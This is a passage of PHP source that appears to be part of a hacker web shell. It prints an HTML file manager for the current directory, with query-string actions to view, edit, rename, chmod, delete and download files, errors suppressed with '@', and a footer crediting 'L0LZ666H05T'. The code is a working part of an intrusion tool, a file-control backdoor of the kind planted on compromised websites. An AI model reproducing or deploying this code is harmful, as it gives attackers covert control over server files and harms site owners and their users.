		    <a href='?action=delete&dir=" .
            curldir() .
            "&files=" .
            $folder .
            "'>Delete</a>";
        print "<tr class='hover'><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp" .
            "/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> ";
        print "<div class='dropdown'>";
        print "<a class='dropbtn' href='?dir=" .
            curldir() .
            DIRECTORY_SEPARATOR .
            $folder .
            "'>" .
            $folder .
            "<a>";
        print "<div class='dropdown-content'>";
        print $tool;
        print "</td><td><center>" . type($folder) . "</center></td>";
        print "<td><center>--</center></td>";
        print "<td><center>";
        print @w($folder, @perms($folder));
        print "</center></td>";
    }
    print "<tr class='first'><td></td><td></td><td></td><td></td></tr>";
    foreach (scdir() as $file) {
        if (!is_file(curldir() . DIRECTORY_SEPARATOR . $file)) {
            continue;
        }
        $tools =
            "
		<a href='?action=view&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>
		View</a>
		<a href='?action=renames&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>
		Rename</a>
		<a href='?action=chmods&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>
		Chmod</a>
		<a href='?action=delete&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>
		Delete</a>
		<a href='?action=download&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>
		Download</a>";
        print "<tr class='hover'><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> ";
        print "<div class='dropdown'>";
        print "<a class='dropbtn' href='?action=edit&dir=" .
            @curldir() .
            "&files=" .
            @curldir() .
            SEP .
            $file .
            "'>" .
            $file .
            "</a>";
        print "<div class='dropdown-content'>";
        print $tools;
        print "</td><td><center>" . type($file) . "</center></td>";
        print "<td><center>" . size($file) . "</center></td>";
        print "<td><center>";
        print @w($file, @perms($file));
        print "</center></td>";
    }
}
@filemanager();
?>
<tr>
	<th colspan="4">&copy; L0LZ666H05T <?php print date("Y"); ?></th>
</tr>
